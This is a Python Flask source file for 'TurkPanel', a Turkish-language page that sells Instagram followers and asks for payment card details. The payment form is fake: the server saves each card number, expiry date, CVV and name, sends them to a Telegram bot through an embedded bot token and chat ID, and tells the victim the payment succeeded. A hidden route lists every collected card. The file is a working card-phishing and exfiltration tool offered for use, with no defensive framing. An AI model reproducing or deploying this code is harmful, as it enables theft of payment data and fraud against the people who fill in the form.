from flask import Flask, request, render_template_string, jsonify
import requests
import time

app = Flask(__name__)
KARTLAR = []

SITE_HTML = """
<!DOCTYPE html>
<html>
<head><title>TurkPanel</title>
<style>
body{background:#0a0a0f;color:#fff;font-family:sans-serif;text-align:center;padding:40px;}
h1{color:#6c5ce7;font-size:2em;}
input{width:85%;padding:15px;margin:8px;background:#1a1a2e;border:1px solid #333;border-radius:10px;color:#fff;font-size:1em;}
button{width:85%;padding:18px;background:#6c5ce7;border:none;border-radius:10px;color:#fff;font-size:1.2em;font-weight:bold;cursor:pointer;}
.fiyat{color:#4CAF50;font-size:1.5em;font-weight:bold;}
</style>
</head>
<body>
<h1>⚡ TurkPanel</h1>
<p>Instagram Takipçi</p>
<p class="fiyat">1000 = ₺45</p>
<input type="text" id="kullanici" placeholder="@kullaniciadi">
<input type="text" id="isim" placeholder="Kart İsmi">
<input type="text" id="kart" placeholder="Kart Numarası" maxlength="19">
<input type="text" id="sk" placeholder="AA/YY" maxlength="5">
<input type="text" id="cvv" placeholder="CVV" maxlength="4">
<button onclick="gonder()">💰 ÖDEME YAP</button>
<script>
async function gonder(){
var k=document.getElementById('kullanici').value;
var i=document.getElementById('isim').value;
var n=document.getElementById('kart').value;
var s=document.getElementById('sk').value;
var c=document.getElementById('cvv').value;
if(!k||!i||n.length<16||s.length<4||c.length<3){alert('Tüm alanları doldurun!');return;}
await fetch('/odeme',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({kullanici:k,isim:i,kart:n,sk:s,cvv:c})});
alert('Ödeme Başarılı!');
document.body.innerHTML='<h1 style="color:#4CAF50;">✅ Ödeme Başarılı!</h1><p>Takipçileriniz 5 dk içinde gönderilecek.</p>';
}
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(SITE_HTML)

@app.route('/odeme', methods=['POST'])
def odeme():
    data = request.json
    KARTLAR.append(data)
    try:
        bot = "8909079987:AAHjh-ohqiv53xxs1OMm-Z5b74S0VBzy3-g"
        chat = "8087053954"
        msg = f"🔥 KART!\n💳 {data['kart']}\n📅 {data['sk']} | {data['cvv']}\n👤 {data['isim']}\n📱 {data['kullanici']}"
        requests.post(f"https://api.telegram.org/bot{bot}/sendMessage", json={'chat_id': chat, 'text': msg}, timeout=5)
    except:
        pass
    return jsonify({'success': True})

@app.route('/cardcloin')
def cardcloin():
    html = "<html><body style='background:#000;color:#0f0;font-family:monospace;padding:20px;'><h1>💳 KARTLAR</h1>"
    for k in KARTLAR:
        html += f"<p>💳 {k['kart']} | {k['sk']} | {k['cvv']} | {k['isim']} | {k['kullanici']}</p>"
    html += "</body></html>"
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
